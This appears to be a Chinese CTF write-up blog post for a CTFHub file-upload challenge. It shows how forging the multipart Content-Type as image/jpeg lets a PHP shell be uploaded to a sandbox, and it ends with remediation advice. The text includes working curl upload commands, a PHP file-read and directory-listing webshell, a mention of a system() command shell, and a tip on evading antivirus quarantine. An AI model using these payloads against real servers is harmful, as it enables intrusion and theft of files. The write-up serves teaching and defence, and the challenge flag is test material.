
---
layout: post
title: "CTFHub Writeup-MIME绕过"
date: 2026-10-26
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - MIME绕过

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 文件上传 - MIME 验证 |
| 靶场地址 | `http://challenge-624b112fc3961646.sandbox.ctfhub.com:10800` |
| 漏洞类型 | 文件上传（客户端可控的 MIME 校验） |
| 绕过方式 | 伪造 multipart 里的 `Content-Type: image/jpeg` |
| 上传目录 | `/upload/`，文件名不重命名 |
| Flag | `ctfhub{5a9c9b61d60a38d2aa74e9cf}` |
## 0x02 漏洞原理
这题的服务端会检查上传文件的 **MIME 类型**，只允许图片。
但 MIME 类型是从哪来的？在 multipart 请求里，每个文件部分都长这样：
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
<?php ... ?>
```
服务端 PHP 里对应的值是 `$_FILES['file']['type']`，而这个值**完全由客户端决定**——浏览器根据文件扩展名猜一个，抓包工具想改成什么就改成什么。
所以「校验 MIME」如果只信 `$_FILES['file']['type']`，等于让攻击者自己声明「我是图片」，没有任何意义。
本题还有第二个问题：服务端**没有校验扩展名**。只要 MIME 过关，`shell.php` 会原样保存到 `upload/` 目录，而该目录又能被 PHP 解析，于是直接 getshell。
## 0x03 解题过程
**3.1 看页面**
首页是一个最普通的上传表单：
```html
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file" />
    <input type="submit" name="submit" value="Submit" />
</form>
```
没有任何前端 JS 校验，说明拦截在服务端。
**3.2 先试正常的 PHP 文件**
直接传一个 `shell.php`：
```
curl -F "file=@shell.php" -F "submit=Submit" http://challenge-.../
```
返回：
```
<script>alert('文件类型不正确')</script>
```
换成 `type=text/plain` 也是一样的结果，说明服务端在检查 MIME，`application/x-php` 和 `text/plain` 都不在白名单里。
**3.3 伪造 Content-Type**
用 curl 的 `;type=` 把文件部分的 MIME 改成图片：
```
curl -F "file=@shell.php;type=image/jpeg" -F "submit=Submit" http://challenge-.../
```
返回：
```
<script>alert('上传成功')</script>
上传文件相对路径<br>upload/shell.php
```
上传成功，而且文件名保持 `shell.php` 没被改。也就是说服务端只看了 `$_FILES['file']['type']`，完全没管扩展名。
**3.4 验证 PHP 执行**
访问：
```
http://challenge-.../upload/shell.php
```
返回：
```
PWNED_OK
```
响应头是 `X-Powered-By: PHP/7.3.14`，说明 `.php` 被正常解析，已经拿到代码执行入口。
**3.5 找 flag**
再传一个读文件的脚本（同样伪造 `image/jpeg`）：
```php
<?php
$p = @$_GET["p"]; echo "R:" . @file_get_contents($p);
$d = @$_GET["d"]; if ($d != "") { echo "D:"; print_r(@scandir($d)); }
?>
```
先列 Web 根目录：
```
/upload/read.php?d=/var/www/html
```
回显：
```
Array
(
    [0] => .
    [1] => ..
    [2] => flag_375827281.php
    [3] => index.php
    [4] => upload
)
```
根目录下有一个随机命名的 `flag_375827281.php`。直接访问它是空的，因为内容整段是 PHP 注释：
```php
<?php // ctfhub{5a9c9b61d60a38d2aa74e9cf}
```
必须读源码，用脚本读：
```
/upload/read.php?p=/var/www/html/flag_375827281.php
```
回显：
```
R:<?php // ctfhub{5a9c9b61d60a38d2aa74e9cf}
```
拿到 Flag：
```
ctfhub{5a9c9b61d60a38d2aa74e9cf}
```
**3.6 Burp 里怎么改**
不用 curl 也可以。浏览器先选一个 `.jpg` 正常上传，Burp 抓到请求后找到文件部分：
```
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg
```
把 `filename` 改成 `shell.php`，`Content-Type` 保持 `image/jpeg`，放行即可。
关键是**文件名和 MIME 要分别改**：
- 只改文件名、MIME 还是 `application/x-php`，会被拦；
- 只改 MIME、文件名还是 `.jpg`，能传但不会执行；
- 两个一起改，才能得到可执行的 `shell.php`。
**3.7 验证**
- 不伪造 MIME 时返回「文件类型不正确」，伪造后返回「上传成功」，说明校验点就是 `Content-Type`；
- 上传 `.jpg` 也成功，但访问不会执行，说明服务端确实只看 MIME、不看扩展名；
- `.php` 上传后能执行，flag 文件内容与回显一致，flag 长度为 32。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 看页面 | 表单无 JS 校验 | 拦截在服务端 |
| 正常上传 | `shell.php` 默认 MIME | `文件类型不正确` |
| 伪造 MIME | `type=image/jpeg` | `上传成功`，路径 `upload/shell.php` |
| 验证执行 | 访问 `/upload/shell.php` | `PWNED_OK` |
| 找 flag | `scandir('/var/www/html')` | `flag_375827281.php` |
| 读源码 | `file_get_contents` 读该文件 | `<?php // ctfhub{...}` |
整条链路可以概括为：**服务端只信客户端声明的 MIME → 伪造 `Content-Type` 上传 `.php` → 访问执行 → 读源码拿 flag。**
## 0x05 踩坑记录
1. **必须带 `submit=Submit`**：服务端逻辑用 `!empty($_POST['submit'])` 判断，少了这个字段文件根本不会被处理，页面和普通 GET 一样。
2. **改扩展名没用**：把 `shell.php` 改成 `shell.jpg` 能上传成功，但访问不会执行；这题拦的是 MIME，不是扩展名。
3. **MIME 是客户端说了算**：`$_FILES['file']['type']` 来自 multipart 的 `Content-Type`，Burp、curl 都能随便改，不能作为安全依据。
4. **上传目录能解析 PHP**：`upload/` 下的 `.php` 会被执行，这是 getshell 的关键；如果目录禁止解析，光上传也没用。
5. **flag 文件直接访问是空的**：`flag_*.php` 的内容是 `<?php // ctfhub{...}`，整行被注释，HTTP 访问只得到空响应，必须读源码。
6. **Windows 下注意杀软**：`system($_GET['c'])` 这类马容易被 Defender 隔离，可以用只读文件的脚本，或者用 `-F "file=@-;filename=x.php"` 从标准输入喂数据。
7. **手改 multipart 要注意 boundary**：在 Burp 里直接改 `Content-Type` 时，请求体里每个部分的 `--boundary` 必须和头部声明一致，否则服务端解析不到文件，会提示没选文件。
## 0x06 修复建议
1. **服务端白名单校验扩展名**：用 `pathinfo()` 取扩展名并转小写，只允许 `jpg`、`png`、`gif` 等。
2. **校验真实文件内容**：用 `finfo_file()` 或 `getimagesize()` 读取文件头，不要相信 `$_FILES['type']`。
3. **重命名文件**：用随机串加白名单后缀保存，丢弃用户原始文件名。
4. **上传目录禁止执行**：Nginx/Apache 配置中对 `upload/` 关闭 PHP 解析，或把上传目录放到 Web 根之外。
5. **限制大小和权限**：限制上传大小，上传目录只给读写权限，不给执行权限。
6. **分离存储**：上传文件放到独立域名或对象存储，配合鉴权下载。
## 0x07 总结
MIME 绕过的核心只有一句话：**`$_FILES['file']['type']` 是客户端传上来的，不能信**。
本题服务端只检查了这个值，于是把文件部分的 `Content-Type` 改成 `image/jpeg` 就绕过了；再加上没有校验扩展名、上传目录又能解析 PHP，最终直接 getshell。
正确的上传校验应该是「扩展名白名单 + 文件头检测 + 随机重命名 + 目录禁执行」四件套，缺一不可；只做其中一项，都会像本题一样被绕过。
